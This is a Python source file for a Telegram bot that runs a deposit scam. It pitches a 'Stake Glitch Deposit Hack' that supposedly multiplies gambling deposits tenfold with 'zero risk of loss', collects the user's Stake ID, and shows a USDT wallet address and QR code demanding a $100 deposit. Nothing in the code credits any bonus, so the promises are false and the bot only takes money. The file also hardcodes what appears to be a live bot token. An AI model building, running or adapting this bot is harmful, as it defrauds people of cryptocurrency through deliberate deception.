from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
)

# Replace with your actual bot token
BOT_TOKEN = '7842485228:AAFb3cDj8RTkR26Vkd5ZZ927ePQPs2g49D4'
USDT_ADDRESS = 'YOUR_USDT_ADDRESS'
QR_CODE_FILE = 'qr_code.png'  # Path to your QR code image

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    text = f'hii "{user_name}" are you ready for stake 10x deposit? If yes then continue'
    keyboard = [[InlineKeyboardButton("Continue", callback_data="continue")]]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "continue":
        text = "Do you want to make a deposit?"
        keyboard = [
            [InlineKeyboardButton("Yes", callback_data="deposit_yes"),
             InlineKeyboardButton("No", callback_data="deposit_no")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "deposit_yes":
        text = (
            "🎰 Stake Glitch Deposit Hack (One-Time Use)\n"
            "We’ve discovered a glitch with Stake bonus deposit codes — and here’s how it works:\n\n"
            "💎 What It Does\n"
            "We scrape and apply special bonus deposit codes that multiply your deposit 10x instantly.\n\n"
            "⚠️ This only works once per account ID.\n\n"
            "🧠 Important Note\n"
            "You can’t withdraw the funds immediately.\n"
            "The bonus behaves like regular Stake bonuses — you must wager the full amount before withdrawing.\n\n"
            "💰 What’s in It for You?\n"
            "I’ll provide you with a step-by-step strategy to play safely, wager the required amount, and withdraw the full balance — with zero risk of loss if done right."
        )
        keyboard = [[InlineKeyboardButton("Deposit", callback_data="deposit")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "deposit":
        await query.edit_message_text("Please enter your Stake user ID:")

        # Set state to expect user ID next
        context.user_data['awaiting_user_id'] = True

    elif data == "confirm_user_id":
        # Send USDT address and QR code
        text = f"Send your deposit to the following address:\n\n{USDT_ADDRESS}\n\nDeposit 100$"
        keyboard = [[InlineKeyboardButton("Confirm payment", callback_data="confirm_payment")]]
        await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        with open(QR_CODE_FILE, 'rb') as qr:
            await query.message.reply_photo(qr)

    elif data == "confirm_payment":
        text = (
            "🕒 Payment Verification Notice\n\n"
            "Your payment will be verified within 10–15 minutes.\n\n"
            "✅ Once verified, your Stake ID will be credited within 5 minutes.\n"
            "If you still don’t see the funds added, please contact the admin — we're here to help!"
        )
        await query.edit_message_text(text)

async def handle_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_user_id'):
        user_id = update.message.text
        context.user_data['stake_user_id'] = user_id
        context.user_data['awaiting_user_id'] = False
        text = f"Your Stake user ID is: {user_id}\n\nType CONFIRM to confirm."
        await update.message.reply_text(text)
        context.user_data['awaiting_confirm'] = True

    elif context.user_data.get('awaiting_confirm') and update.message.text.strip().upper() == "CONFIRM":
        # Simulate button press for confirm_user_id
        keyboard = [[InlineKeyboardButton("Continue", callback_data="confirm_user_id")]]
        await update.message.reply_text("Click continue to receive deposit details.", reply_markup=InlineKeyboardMarkup(keyboard))
        context.user_data['awaiting_confirm'] = False

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_buttons))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_user_id))
    app.run_polling()

if __name__ == "__main__":
    main()
